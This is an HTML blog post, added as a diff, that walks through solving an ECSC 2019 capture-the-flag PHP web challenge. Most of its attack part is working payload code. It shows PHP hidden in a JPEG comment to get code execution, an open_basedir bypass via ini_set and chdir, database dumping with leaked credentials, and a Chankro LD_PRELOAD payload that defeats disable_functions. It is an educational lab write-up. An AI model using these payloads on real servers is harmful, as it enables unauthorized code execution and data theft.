@@ -1,0 +1,706 @@
+<!DOCTYPE html>
+<html prefix="og: http://ogp.me/ns#">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <title>ECSC - Ceci n&#39;est pas une pipe &middot; dotan3</title>
+        <meta name="description" content="The challenge description:
+Ça se passe par ici : http://challenges.ecsc-teamfrance.fr:8001  Reconnaissance Ceci n&#39;est pas une pipe is the very first challenge I tried during ECSC 2019 qualifications. It&rsquo;s a web challenge and it starts with a login page:
+First steps From this very first page, some information already:
+ It&rsquo;s probably a PHP challenge because of the url: login.php The HTML source does not reveal anything interesting According to the HTTP response headers, the web server is Apache 2.">
+        <meta name="HandheldFriendly" content="True">
+        <meta name="MobileOptimized" content="320">
+        <meta name="generator" content="Hugo 0.55.6" />
+        <meta name="robots" content="index,follow">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta property="og:title" content="ECSC - Ceci n&#39;est pas une pipe">
+<meta property="og:description" content="The challenge description:
+Ça se passe par ici : http://challenges.ecsc-teamfrance.fr:8001  Reconnaissance Ceci n&#39;est pas une pipe is the very first challenge I tried during ECSC 2019 qualifications. It&rsquo;s a web challenge and it starts with a login page:
+First steps From this very first page, some information already:
+ It&rsquo;s probably a PHP challenge because of the url: login.php The HTML source does not reveal anything interesting According to the HTTP response headers, the web server is Apache 2.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://dotan3.github.io/2019/05/31/2019-05-23-ecsc-ceci-n-est-pas-une-pipe/">
+        <link rel="stylesheet" href="https://dotan3.github.iodist/styles.css">
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,400,600,700,300&subset=latin,cyrillic-ext,latin-ext,cyrillic">
+        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+        
+        
+        
+    </head>
+    <body>
+        
+<script type="application/javascript">
+var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
+var doNotTrack = (dnt == "1" || dnt == "yes");
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'XXX', 'auto');
+	ga('set', 'anonymizeIp', true);
+	ga('send', 'pageview');
+}
+</script>
+
+
+        <div id="wrapper">
+            <header class="site-header">
+                <div class="container">
+                    <div class="site-title-wrapper">
+                        
+                            <h1 class="site-title">
+                                <a title="dotan3&#39;s CTF adventures" href="https://dotan3.github.io">dotan3&#39;s CTF adventures</a>
+                            </h1>
+                        
+                        <a class="button-square" href="https://dotan3.github.ioindex.xml"><i class="fa fa-rss"></i></a>
+                        
+                        
+                        
+                            <a class="button-square button-social hint--top" data-hint="Github" title="Github" href="https://github.com/dotan3" rel="me">
+                                <i class="fa fa-github-alt"></i>
+                            </a>
+                        
+                        
+                        
+                        
+                        
+                    </div>
+
+                    <ul class="site-nav">
+                        
+    <li class="site-nav-item">
+        <a title="Blog" href="/">Blog</a>
+    </li>
+
+    <li class="site-nav-item">
+        <a title="About" href="/page/about/">About</a>
+    </li>
+
+                    </ul>
+                </div>
+            </header>
+
+            <div id="container">
+
+
+<div class="container">
+    <article class="post-container" itemscope="" itemtype="http://schema.org/BlogPosting">
+        <header class="post-header">
+    <h1 class="post-title" itemprop="name headline">ECSC - Ceci n&#39;est pas une pipe</h1>
+    
+    <p class="post-date">
+        <span>Published <time datetime="2019-05-31" itemprop="datePublished">Fri, May 31, 2019</time></span>
+        <span>by</span>
+        <span itemscope="" itemprop="author" itemtype="https://schema.org/Person">
+            <span itemprop="name">
+                <a href="https://github.com/dotan3" itemprop="url" rel="author">dotan3</a>
+            </span>
+        </span>
+    </p>
+    
+        <p class="post-reading post-line">
+            <span>Estimated reading time: 9 min</span>
+        </p>
+    
+</header>
+
+        <div class="post-content clearfix" itemprop="articleBody">
+    
+
+    
+
+<p>The challenge description:</p>
+
+<pre><code>Ça se passe par ici : http://challenges.ecsc-teamfrance.fr:8001
+</code></pre>
+
+<h2 id="reconnaissance">Reconnaissance</h2>
+
+<p><code>Ceci n'est pas une pipe</code> is the very first challenge I tried during <a href="https://www.ssi.gouv.fr/administration/actualite/rejoignez-lequipe-france-pour-la-prochaine-edition-du-challenge-europeen-de-cybersecurite/">ECSC 2019 qualifications</a>. It&rsquo;s a web challenge and it starts with a login page:</p>
+
+<p><img src="/img/ecsc-2019-ceci-nest-pas-une-pipe-login.png" alt="ECSC 2019 - Ceci n'est pas une pipe - Login" /></p>
+
+<h3 id="first-steps">First steps</h3>
+
+<p>From this very first page, some information already:</p>
+
+<ul>
+<li>It&rsquo;s probably a PHP challenge because of the url: <code>login.php</code></li>
+<li>The HTML source does not reveal anything interesting</li>
+<li>According to the HTTP response headers, the web server is <code>Apache 2.4.25 (Debian)</code>
+
+<ul>
+<li>From tihs <a href="https://packages.debian.org/search?keywords=apache2">we can infer</a> that Debian version is Stretch and Apache is at the latest stable version</li>
+</ul></li>
+<li>I tried simplistic <abbr title="SQL injection">SQLi</abbr>, nothing</li>
+</ul>
+
+<p><img src="/img/ecsc-2019-ceci-nest-pas-une-pipe-http-response-headers.png" alt="ECSC 2019 - Ceci n'est pas une pipe - HTTP response headers" /></p>
+
+<p>Seeing a <code>/static</code> folder in the HTML source, I tried to list the contents but it seems directory listing is forbidden on this server:</p>
+
+<p><img src="/img/ecsc-2019-ceci-nest-pas-une-pipe-forbidden-directory-listing.png" alt="ECSC 2019 - Ceci n'est pas une pipe - Forbidden direcory listing" /></p>
+
+<h3 id="gobustering">Gobustering</h3>
+
+<p>As always for a web challenge I let an instance of <code>gobuster</code> run in the background while I do manual recon.</p>
+
+<blockquote>
+<p>It&rsquo;s always good to have some type of enumeration running in the background</p>
+</blockquote>
+
+<p>Inspiration: <a href="https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA">Ippsec</a></p>
+
+<pre><code class="language-bash">$ go run /opt/gobuster/main.go -w /opt/wordlists/SecLists/Discovery/Web-Content/quickhits.txt -u http://challenges.ecsc-teamfrance.fr:8001 -x php
+</code></pre>
+
+<p>It did not find that much besides the URLs that are already visible in the browser. One stood out though:</p>
+
+<pre><code>/config.php (Status: 200)
+</code></pre>
+
+<p>I get a 200 when requesting this on the server but it gives back an empty page.<br>
+More on that later.</p>
+
+<h3 id="creating-an-account">Creating an account</h3>
+
+<p>So far so good, nothing particularily interesting so let&rsquo;s create an account and login:</p>
+
+<p><img src="/img/ecsc-2019-ceci-nest-pas-une-pipe-logged-in.png" alt="ECSC 2019 - Ceci n'est pas une pipe - Logged in" /></p>
+
+<p>OK now we know we can add notes with files, let&rsquo;s try with a simple .txt first:</p>
+
+<pre><code class="language-bash">$ echo &quot;dotan3&quot; &gt; test.txt
+</code></pre>
+
+<p>It does not work, the web server is expecting a <code>JPEG</code> or a <code>PNG</code> file that&rsquo;s below 100kB:</p>
+
+<p><img src="/img/ecsc-2019-ceci-nest-pas-une-pipe-webserver-expects-an-image.png" alt="ECSC 2019 - Ceci n'est pas une pipe - Web server expects an image" /></p>
+
+<p>So let&rsquo;s try again with a <code>.png</code> file:</p>
+
+<p><img src="/img/ecsc-2019-ceci-nest-pas-une-pipe-working-png-upload.png" alt="ECSC 2019 - Ceci n'est pas une pipe - Working .png upload" /></p>
+
+<p>By hovering the image name, we notice the following URL:</p>
+
+<p><code>http://challenges.ecsc-teamfrance.fr:8001//upload/a24aa868b0558786eb26f02ffe704b59305e4cc41c1641909620d63799677660/googlelogo_color_92x30dp.png</code></p>
+
+<h3 id="attacking-the-file-upload-feature">Attacking the file upload feature</h3>
+
+<p>Since it&rsquo;s a PHP challenge, maybe there&rsquo;s a way to smuggle some PHP code inside an image?<br>
+Let&rsquo;s try!</p>
+
+<p>At first I tried to grab the HTTP request in Burp and repeat it, trying these things:</p>
+
+<ul>
+<li>Upload a .php file renamed as a .jpg &gt; <span style="color: red;">failure</span></li>
+<li>Upload a .php file with tweaked content-type &gt; <span style="color: red;">failure</span></li>
+<li>Upload a .png file with some php code in it &gt; <span style="color: red;">failure</span></li>
+<li>Upload a .php file with GIF magic bytes at the begining &gt; <span style="color: red;">failure</span></li>
+</ul>
+
+<p>From these tests we can guess that there&rsquo;s some type of MIME type check; apparently the extension does not matter, the uploaded file just has to be a valid png/jpg file.</p>
+
+<p>After some googling I found <code>jhead</code>, a utility that allows to manipulate jpg headers: <a href="http://www.sentex.net/~mwandel/jhead/">http://www.sentex.net/~mwandel/jhead/</a>, so maybe I could inject PHP in an image?<br>
+Let&rsquo;s find out:</p>
+
+<pre><code class="language-bash">$ sudo apt search jhead # cool it's available!
+$ sudo apt install jhead
+$ jhead -h
+Jhead is a program for manipulating settings and thumbnails in Exif jpeg headers
+used by most Digital Cameras.  v3.00 Matthias Wandel, Jan 30 2013.
+http://www.sentex.net/~mwandel/jhead
+
+Usage: jhead [options] files
+Where:
+ files       path/filenames with or without wildcards
+[options] are:
+
+GENERAL METADATA:
+  -te &lt;name&gt; Transfer exif header from another image file &lt;name&gt;
+             Uses same name mangling as '-st' option
+  -dc        Delete comment field (as left by progs like Photoshop &amp; Compupic)
+  -de        Strip Exif section (smaller JPEG file, but lose digicam info)
+  -di        Delete IPTC section (from Photoshop, or Picasa)
+  -dx        Deletex XMP section
+  -du        Delete non image sections except for Exif and comment sections
+  -purejpg   Strip all unnecessary data from jpeg (combines -dc -de and -du)
+  -mkexif    Create new minimal exif section (overwrites pre-existing exif)
+  -ce        Edit comment field.  Uses environment variable 'editor' to
+             determine which editor to use.  If editor not set, uses VI
+             under Unix and notepad with windows
+</code></pre>
+
+<p>That little <code>-ce</code> looks promising, so let&rsquo;s try it on a <code>.jpg</code> file that I rename to <code>.php</code>:</p>
+
+<pre><code class="language-bash">$ mv file.jpg file.php
+$ jhead -ce file.php
+</code></pre>
+
+<p>This jumps me into <code>vim</code> and I can add a very simple PHP snippet:</p>
+
+<pre><code class="language-php">&lt;?php echo &quot;DOTAN3&quot;; ?&gt;
+</code></pre>
+
+<ul>
+<li>Create a new note with this file</li>
+<li>Access the file</li>
+<li>Voilà!</li>
+</ul>
+
+<p><img src="/img/ecsc-2019-ceci-nest-pas-une-pipe-php-exec.png" alt="ECSC 2019 - Ceci n'est pas une pipe - PHP execution" /></p>
+
+<p>From this we know we have remote PHP execution on the server (<abbr title="Remote Code Execution">RCE</abbr>).</p>
+
+<h2 id="reconnaissance-pt-2">Reconnaissance, pt. 2</h2>
+
+<p>Now that we have RCE, let&rsquo;s try and dig further, first by knowing a bit more about the PHP environment.<br></p>
+
+<h3 id="lfi-attempt">LFI attempt</h3>
+
+<p>I first tried to read the source code for the challenge and in parallel show the contents of the uploaded file to check if there&rsquo;s some restrcition on paths:</p>
+
+<pre><code class="language-php">&lt;?php
+    echo &quot;DOTAN3 - START&quot;;
+    echo file_get_contents('../../index.php');
+    echo file_get_contents('file.jpg');
+    echo &quot;DOTAN3 - END&quot;;
+?&gt;
+</code></pre>
+
+<p><small>I always keep some <code>DOTAN3</code> markers so that I know my script was executed and if it went til the end.</small>
+<small>I am very happy to see that multiline PHP works, it will be much easier to read when my payload starts to grow&hellip;</small></p>
+
+<p>I could not get the contents of <code>file.jpg</code> nor of <code>../../index.php</code>.<br>
+<strong>There&rsquo;s definetely some filetering here.</strong></p>
+
+<h3 id="rce-attempt">RCE attempt</h3>
+
+<p>First thing I tried next was execute some system calls using PHP methods such as <code>exit()</code>, <code>system()</code> or <code>shell_exec()</code>:</p>
+
+<pre><code class="language-php">&lt;?php
+    echo &quot;DOTAN3 - START&quot;;
+    exec('ls');
+    system('pwd');
+    shell_exec('whoami');
+    echo &quot;DOTAN3 - END&quot;;
+?&gt;
+</code></pre>
+
+<p><small>I use 3 different commands inside the system calls so that I know which one succeeded&hellip;</small></p>
+
+<p>It looks like <strong>system call functions are forbidden</strong> too because I have nothing back.<br>
+Now is a good time to check <code>phpinfo()</code>;</p>
+
+<pre><code class="language-php">&lt;?php
+    echo &quot;DOTAN3 - START&quot;;
+    phpinfo();
+    echo &quot;DOTAN3 - END&quot;;
+?&gt;
+</code></pre>
+
+<p>Bingo!</p>
+
+<p><img src="/img/ecsc-2019-ceci-nest-pas-une-pipe-phpinfo.png" alt="ECSC 2019 - Ceci n'est pas une pipe - phpinfo()" /></p>
+
+<h2 id="bypassing-restrictions">Bypassing restrictions</h2>
+
+<p>I had a look at a few interesting areas in the result of <code>phpinfo()</code>:</p>
+
+<h3 id="known-our-limits">Known our limits&hellip;</h3>
+
+<h4 id="environment">Environment</h4>
+
+<p><img src="/img/ecsc-2019-ceci-nest-pas-une-pipe-phpinfo-environment.png" alt="ECSC 2019 - Ceci n'est pas une pipe - phpinfo() - environment" /></p>
+
+<h4 id="core-values">Core values</h4>
+
+<p><img src="/img/ecsc-2019-ceci-nest-pas-une-pipe-phpinfo-core-values.png" alt="ECSC 2019 - Ceci n'est pas une pipe - phpinfo() - core values" /></p>
+
+<h4 id="open-basedir">open_basedir</h4>
+
+<p><img src="/img/ecsc-2019-ceci-nest-pas-une-pipe-phpinfo-open_basedir.png" alt="ECSC 2019 - Ceci n'est pas une pipe - phpinfo() - open_basedir" /></p>
+
+<p>Some really useful information there:</p>
+
+<ul>
+<li>We know the application working directory is the classic <code>/var/www/html</code></li>
+<li>We could not use <code>file_get_contents</code> because read the values for <code>allow_url_fopen</code> are <code>OFF</code></li>
+<li>We could not use any system calls because the functions are in the <code>disable_functions</code></li>
+<li>There&rsquo;s some <code>prepend.php</code> file loaded from <code>/usr/share/php/chall/prepend.php</code>
+
+<ul>
+<li>Interesting, I did not even know about that <a href="https://www.php.net/manual/fr/ini.core.php#ini.auto-prepend-file">prepend feature</a> in PHP!</li>
+</ul></li>
+</ul>
+
+<h3 id="trying-more-lfi-with-this-knowledge">Trying more LFI with this knowledge</h3>
+
+<p>Maybe we can override <code>allow_url_fopen</code> settings with some <code>ini_set()</code>?</p>
+
+<pre><code class="language-php">&lt;?php
+    echo &quot;DOTAN3 - START&quot;;
+    ini_set('allow_url_fopen', 1);
+    echo file_get_contents('sample.php');
+    echo &quot;DOTAN3 - END&quot;;
+?&gt;
+</code></pre>
+
+<p>Upload again and display the uploaded file:</p>
+
+<p><img src="/img/ecsc-2019-ceci-nest-pas-une-pipe-bypass-allow_url_fopen.png" alt="ECSC 2019 - Ceci n'est pas une pipe - Bypassing allow_url_fopen" /></p>
+
+<p>We&rsquo;re able to see the contents of the file itself, it works!</p>
+
+<p>Now let&rsquo;s try to do things for files outside of <code>open_basedir</code>&hellip;</p>
+
+<h3 id="bypassing-open-basedir-restriction">Bypassing open_basedir restriction</h3>
+
+<p>I remembered a while back seeing on twitter a way to bypass <code>open_basedir</code> restrictions so I went and searched for it:</p>
+
+<p><img src="/img/ecsc-2019-ceci-nest-pas-une-pipe-searching-for-open_basedir-bypass-on-twitter.png" alt="ECSC 2019 - Ceci n'est pas une pipe - Searching for open_basedir bypass on twitter" /></p>
+
+<p>Source: <a href="https://twitter.com/edgarboda/status/1113839230608797696">https://twitter.com/edgarboda/status/1113839230608797696</a></p>
+
+<p>Let&rsquo;s try it!</p>
+
+<pre><code class="language-php">&lt;?php
+    echo &quot;DOTAN3 - START&quot;;
+    ini_set('allow_url_fopen', 1);
+    mkdir('tmp');
+    chdir('tmp');
+    ini_set('open_basedir', '..');
+    chdir('..');
+    chdir('..');
+    chdir('..');
+    chdir('..');
+    chdir('..');
+    ini_set('open_basedir', '/');
+    echo file_get_contents('/var/www/html/index.php');
+    echo &quot;DOTAN3 - END&quot;;
+?&gt;
+</code></pre>
+
+<p>And it works!</p>
+
+<p><img src="/img/ecsc-2019-ceci-nest-pas-une-pipe-bypass-open_basedir-restriction.png" alt="ECSC 2019 - Ceci n'est pas une pipe - Bypassing open_basedir restriction" /></p>
+
+<p>It even looks better when displaying the source of the generated page:</p>
+
+<p><img src="/img/ecsc-2019-ceci-nest-pas-une-pipe-bypass-open_basedir-restriction-source.png" alt="ECSC 2019 - Ceci n'est pas une pipe - Bypassing open_basedir restriction source" /></p>
+
+<p>So now we can have a look at all the source files!</p>
+
+<h2 id="the-wrong-path-to-sql">The (wrong) path to SQL</h2>
+
+<p>Remember the <code>config.php</code> file from enumeration at the begining? Maybe the flag is there?</p>
+
+<p><img src="/img/ecsc-2019-ceci-nest-pas-une-pipe-get-db-credz.png" alt="ECSC 2019 - Ceci n'est pas une pipe - Get DB credz! wOOt!" /></p>
+
+<p>Flag is not in the <code>config.php</code> :-(, but we got DB credz, wOOt!<br>
+Maybe the flag is in the DB?</p>
+
+<p>Let&rsquo;s find out and start by listing the tables that are in the <code>notes</code> DB:</p>
+
+<pre><code class="language-php">&lt;?php
+    echo &quot;DOTAN3 - START&quot;;
+    $c = mysqli_connect(&quot;mariadb&quot;, &quot;notes&quot;, &quot;N9mpnvEyTtaGxfsznEBh&quot;, &quot;notes&quot;);
+    foreach ($c-&gt;query('SHOW TABLES;') as $row) {
+      var_dump($row);
+    }
+    echo &quot;DOTAN3 - END&quot;;
+?&gt;
+</code></pre>
+
+<p>We get two tables, <code>notes</code> and <code>users</code>:</p>
+
+<p><img src="/img/ecsc-2019-ceci-nest-pas-une-pipe-listing-notes-db-tables.png" alt="ECSC 2019 - Ceci n'est pas une pipe - Tables in notes DB" /></p>
+
+<p>Let&rsquo;s dump them!</p>
+
+<pre><code class="language-php">&lt;?php
+    echo &quot;DOTAN3 - START&quot;;
+    $c = mysqli_connect(&quot;mariadb&quot;, &quot;notes&quot;, &quot;N9mpnvEyTtaGxfsznEBh&quot;, &quot;notes&quot;);
+    foreach ($c-&gt;query('SELECT * FROM notes;') as $row) {
+      var_dump($row);
+    }
+    foreach ($c-&gt;query('SELECT * FROM users;') as $row) {
+      var_dump($row);
+    }
+    echo &quot;DOTAN3 - END&quot;;
+?&gt;
+</code></pre>
+
+<p>Haha I get instantly XSSed :P</p>
+
+<p><img src="/img/ecsc-2019-ceci-nest-pas-une-pipe-dumping-notes-users-tables.png" alt="ECSC 2019 - Ceci n'est pas une pipe - Dumping notes and users tables" /></p>
+
+<p>I had a look at the source to try and see if the <strong>flag</strong> was somewhere, but was notwhere to be found&hellip; :-(</p>
+
+<p>I could, however see all the other players attemps at doing so:</p>
+
+<p><img src="/img/ecsc-2019-ceci-nest-pas-une-pipe-another-players-attempt.png" alt="ECSC 2019 - Ceci n'est pas une pipe - Another player's attempt" /></p>
+
+<p>But I stopped there immediately, thinking I would not learn anything if I was able to get the flag that way.<br>
+It&rsquo;s fun knowing you <code>can</code> do it, it does not necessarily mean you <code>should</code> do it.</p>
+
+<h2 id="hitting-the-brick-wall-pt-1">Hitting the brick wall, pt. 1</h2>
+
+<p>That&rsquo;s when I got stuck. If the flag was not in the DB, where could it be?</p>
+
+<p>I tried to display the <code>prepend.php</code> file just so that I would learn something at least:</p>
+
+<pre><code class="language-php">&lt;?php
+    echo &quot;DOTAN3 - START&quot;;
+    ini_set('allow_url_fopen', 1);
+    mkdir('tmp');
+    chdir('tmp');
+    ini_set('open_basedir', '..');
+    chdir('..');
+    chdir('..');
+    chdir('..');
+    chdir('..');
+    chdir('..');
+    ini_set('open_basedir', '/');
+    echo file_get_contents('/usr/share/php/chall/prepend.php');
+    echo &quot;DOTAN3 - END&quot;;
+?&gt;
+</code></pre>
+
+<pre><code class="language-php">&lt;?php
+    ini_set('open_basedir', dirname($_SERVER['SCRIPT_FILENAME']) . ':/usr/share/php/chall:/tmp');
+</code></pre>
+
+<p>More info on <a href="https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file">auto_prepend_file directive</a> on official PHP documentation.</p>
+
+<p>Oh nice ok! So that is automatically adding you own upload folder in the <code>open_basedir</code> folders list. Neat!<br>
+But still, no flag and I start to feel a lack of inspiration.</p>
+
+<hr />
+
+<p>Wait, it&rsquo;s a CTF, maybe the flag is in some of the usual places? Let&rsquo;s try&hellip;</p>
+
+<ul>
+<li>/flag</li>
+<li>/flag.txt</li>
+<li>/root/flag</li>
+<li>&hellip;</li>
+</ul>
+
+<p>After a while (probably 1 hour&hellip;) I finally found where the flag could be: <code>/home/flag</code></p>
+
+<pre><code class="language-php">&lt;?php
+    echo &quot;DOTAN3 - START&quot;;
+    ini_set('allow_url_fopen', 1);
+    mkdir('tmp');
+    chdir('tmp');
+    ini_set('open_basedir', '..');
+    chdir('..');
+    chdir('..');
+    chdir('..');
+    chdir('..');
+    chdir('..');
+    ini_set('open_basedir', '/');
+    echo is_file('/home/flag');
+    echo &quot;DOTAN3 - END&quot;;
+?&gt;
+</code></pre>
+
+<p>This outputs:</p>
+
+<p><code>bool(true)</code></p>
+
+<h2 id="hitting-the-brick-wall-pt-2">Hitting the brick wall, pt. 2</h2>
+
+<p>Cool! Should be easy now, let&rsquo;s just file_get_contents that flag and DONE!<br>
+Oh boy, how wrong was I&hellip;</p>
+
+<pre><code class="language-php">&lt;?php
+    echo &quot;DOTAN3 - START&quot;;
+    ini_set('allow_url_fopen', 1);
+    mkdir('tmp');
+    chdir('tmp');
+    ini_set('open_basedir', '..');
+    chdir('..');
+    chdir('..');
+    chdir('..');
+    chdir('..');
+    chdir('..');
+    ini_set('open_basedir', '/');
+    echo file_get_contents('/home/flag');
+    echo &quot;DOTAN3 - END&quot;;
+?&gt;
+</code></pre>
+
+<p>Nothing. Pleeeease? It took me ages to think I should maybe check the rights on this file:</p>
+
+<pre><code class="language-php">echo substr(sprintf('%o', fileperms('/home/flag')), -4);
+</code></pre>
+
+<p><strong>0311</strong> which is equivalent to <strong>-wx&ndash;x&ndash;x</strong></p>
+
+<p>Which is equivalent to:</p>
+
+<ul>
+<li>everybody can execute it</li>
+<li>just the owner can write it, the owner being root</li>
+</ul>
+
+<p>But how can I execute it if I can&rsquo;t use any of the regular system calls?</p>
+
+<p>I tried then to email the file to me and to exfiltrate it by variously failing techniques.</p>
+
+<blockquote>
+<p>That&rsquo;s when I almost gave up.</p>
+</blockquote>
+
+<p>I left this challenge a few days, thinking I would never succeed at it.</p>
+
+<h2 id="last-chance">Last chance</h2>
+
+<p>Then I started reading about automating the <code>open_basedir</code> restriction bypass and that&rsquo;s when I encountered <a href="https://github.com/TarlogicSecurity/Chankro">Chankro</a>:</p>
+
+<blockquote>
+<p>Your favourite tool to bypass disable_functions and open_basedir in your pentests.</p>
+</blockquote>
+
+<p>OK, sounds like it&rsquo;s for me! Chankro expects a few parameters:</p>
+
+<ul>
+<li>A script to be executed: <code>--input</code></li>
+<li>An output php script: <code>--output</code></li>
+<li>And a path where the output script will be located: <code>--path</code></li>
+</ul>
+
+<p>Let&rsquo;s do this!</p>
+
+<p><strong>First create a flag.sh script:</strong></p>
+
+<pre><code class="language-bash">#!/bin/bash
+# Just execute the flag executable and output to a file I can read
+/home/flag &gt; /var/www/html/upload/4df6956c92a14c5014f891c9017d050bc6d7772b6eab4172726938a124c38e01/flag2
+</code></pre>
+
+<p><strong>Then launch CHankro to generate the output file</strong></p>
+
+<pre><code class="language-bash">$ python chankro.py --arch 64 --input shell.sh --output sample.php --path /var/www/html/upload/4df6956c92a14c5014f891c9017d050bc6d7772b6eab4172726938a124c38e01
+</code></pre>
+
+<p><strong>Then see what&rsquo;s in the file&hellip;</strong></p>
+
+<pre><code class="language-php">&lt;?php
+
+$hook = 'f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAA4AcAAAAAAABAAAAAAAAAAPgZAAAAAAAAAAAAAEAAOAAHAEAAHQAcAAEAAAAFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbAoAAAAAAABsCgAAAAAAAAAAIAAAAAAAAQAAAAYAAAD4DQA...';
+$meterpreter = 'IyEvYmluL2Jhc2gKL2hvbWUvZmxhZyA+IC92YXIvd3d3L2h0bWwvdXBsb2FkLzRkZjY5NTZjOTJhMTRjNTAxNGY4OTFjOTAxN2QwNTBiYzZkNzc3MmI2ZWFiNDE3MjcyNjkzOGExMjRjMzhlMDEvZmxhZzIK';
+file_put_contents('/var/www/html/upload/4df6956c92a14c5014f891c9017d050bc6d7772b6eab4172726938a124c38e01/chankro.so', base64_decode($hook));
+file_put_contents('/var/www/html/upload/4df6956c92a14c5014f891c9017d050bc6d7772b6eab4172726938a124c38e01/acpid.socket', base64_decode($meterpreter));
+putenv('CHANKRO=/var/www/html/upload/4df6956c92a14c5014f891c9017d050bc6d7772b6eab4172726938a124c38e01/acpid.socket');
+putenv('LD_PRELOAD=/var/www/html/upload/4df6956c92a14c5014f891c9017d050bc6d7772b6eab4172726938a124c38e01/chankro.so');
+mail('a','a','a','a');
+
+?&gt;
+</code></pre>
+
+<p><strong>Upload and win!</strong></p>
+
+<ul>
+<li>Uploaded the output.php file</li>
+<li>Accessed it in my uploads folder</li>
+<li>Access the flag2 file</li>
+<li>Got the flag, wOOt!</li>
+</ul>
+
+<p><code>ECSC{f12d9ff3a017065d4d363cea148bef8bfffacc31}</code></p>
+
+<hr />
+
+<h2 id="conclusion">Conclusion</h2>
+
+<ul>
+<li>Securing a PHP file upload it not trivial</li>
+<li>Leaving <code>putenv()</code> and <code>phpinfo()</code> as allowed functions made it <em>easy</em> to find the path to exploitation</li>
+</ul>
+
+<p>Now I just need some time to fully understand what Chankro does, but thanks for this one anyway, I learned many things!</p>
+
+<p>Kudos to the organizers of this CTF that I found quite fun, not too hard so I could progress and learn many new things.</p>
+
+</div>
+
+        <footer class="post-footer clearfix">
+    
+        <p class="post-tags">
+            <span>Tagged:</span>
+            
+            
+                <a href="/tags/web/">web</a>, 
+            
+                <a href="/tags/php/">php</a>, 
+            
+                <a href="/tags/rce/">rce</a>, 
+            
+                <a href="/tags/open_basedir/">open_basedir</a>, 
+            
+                <a href="/tags/allow_url_fopen/">allow_url_fopen</a>, 
+            
+                <a href="/tags/ld_preload/">LD_PRELOAD</a>, 
+            
+                <a href="/tags/putenv/">putenv</a>
+            
+        </p>
+    
+
+    <div class="share">
+        
+
+        
+
+        
+        
+    </div>
+</footer>
+
+        
+    <div class="comments">
+        
+    </div>
+
+    </article>
+</div>
+
+            </div>
+        </div>
+
+        <footer class="footer">
+            <div class="container">
+                <div class="site-title-wrapper">
+                    <h1 class="site-title">
+                        <a title="dotan3&#39;s CTF adventures" href="https://dotan3.github.io">dotan3&#39;s CTF adventures</a>
+                    </h1>
+                    <a class="button-square button-jump-top js-jump-top" href="#">
+                        <i class="fa fa-angle-up"></i>
+                    </a>
+                </div>
+
+                <p class="footer-copyright">
+                    <span>&copy; 2019 / Powered by <a href="https://gohugo.io/">Hugo</a></span>
+                </p>
+                <p class="footer-copyright">
+                    <span><a href="https://github.com/roryg/ghostwriter">Ghostwriter theme</a> By <a href="http://jollygoodthemes.com">JollyGoodThemes</a></span>
+                    <span>/ <a href="https://github.com/jbub/ghostwriter">Ported</a> to Hugo By <a href="https://github.com/jbub">jbub</a></span>
+                </p>
+            </div>
+        </footer>
+
+        <script src="https://dotan3.github.iojs/jquery-1.11.3.min.js"></script>
+        <script src="https://dotan3.github.iojs/jquery.fitvids.js"></script>
+        
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+        
+        
+        <script src="https://dotan3.github.iojs/scripts.js"></script>
+    </body>
+</html>
+
